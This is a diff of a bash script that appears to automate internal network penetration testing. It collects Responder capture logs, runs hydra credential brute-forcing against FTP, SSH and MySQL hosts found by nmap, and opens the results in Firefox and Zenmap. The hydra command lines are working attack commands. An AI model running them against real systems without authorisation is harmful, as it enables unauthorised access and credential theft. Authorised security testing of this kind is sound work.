@@ -98,15 +98,10 @@ mkdir -p $SCAN_RESULTS_LOCATION/Responder_data
 cd logs
 for FILENAME in *; do mv $FILENAME $FILENAME.txt; done 
 mv * $SCAN_RESULTS_LOCATION/Responder_data/
-firefox -new-tab $SCAN_RESULTS_LOCATION/Responder_data/ &
-sleep 1
-
-#Open Zenmap
-zenmap $SCAN_RESULTS_LOCATION/nmap_results/$NETWORK.xml & 
 
 cd $HOME
 #Brute Force attacks
-#mkdir -p $SCAN_RESULTS_LOCATION/bruteforced_creds
+mkdir -p $SCAN_RESULTS_LOCATION/bruteforced_creds
 hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/21-TCP.txt ftp -t1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/ftp.txt
 hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/22-TCP.txt ssh -t1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/ssh.txt
 hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/3306-TCP.txt mysql -t1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/mysql.txt
@@ -116,5 +111,8 @@ hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/
 
 #Open results in IceWeasel
 firefox &
-sleep 3
+sleep 2
 firefox -new-tab $SCAN_RESULTS_LOCATION/ &
+sleep 2
+#Open Zenmap
+zenmap $SCAN_RESULTS_LOCATION/nmap_results/$NETWORK.xml & 
